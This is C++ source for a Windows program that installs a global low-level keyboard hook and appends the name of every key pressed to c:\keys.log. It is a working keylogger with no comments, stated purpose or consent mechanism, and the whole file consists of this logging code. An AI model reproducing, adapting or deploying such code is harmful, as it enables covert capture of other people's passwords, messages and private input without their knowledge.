#include <vcl.h>
#include <fstream>
#pragma hdrstop

using namespace std;

HHOOK hKeyHook;

//---------------------------------------------------------------------------
__declspec(dllexport) LRESULT CALLBACK HookFunc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if  ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        ofstream* out = new ofstream("c:\\keys.log",ios::out|ios::app);

        KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);

        DWORD dwMsg = 1;
        dwMsg += hooked.scanCode << 16;
        dwMsg += hooked.flags << 24;

        char lpszName[0x100] = {0};

        lpszName[0] = '[';
        int i = GetKeyNameText(dwMsg,(lpszName+1),0xFF) + 1;
        lpszName[i] = ']';

        *out << lpszName << endl;

        out->close();   delete out;
    }
    return CallNextHookEx(hKeyHook,nCode,wParam,lParam);
}

//---------------------------------------------------------------------------
void MsgLoop()
{
    MSG message;
    while (GetMessage(&message,NULL,0,0))
    {
        TranslateMessage( &message );   DispatchMessage( &message );
    }
}

//---------------------------------------------------------------------------
WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR s, int)
{
    HINSTANCE hExe = GetModuleHandle(NULL);
    if(!hExe) return 0;

    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)HookFunc,hExe,NULL);

    if(hKeyHook == NULL) return 0;

    MsgLoop();

    UnhookWindowsHookEx(hKeyHook);

    return 0;
}
//---------------------------------------------------------------------------
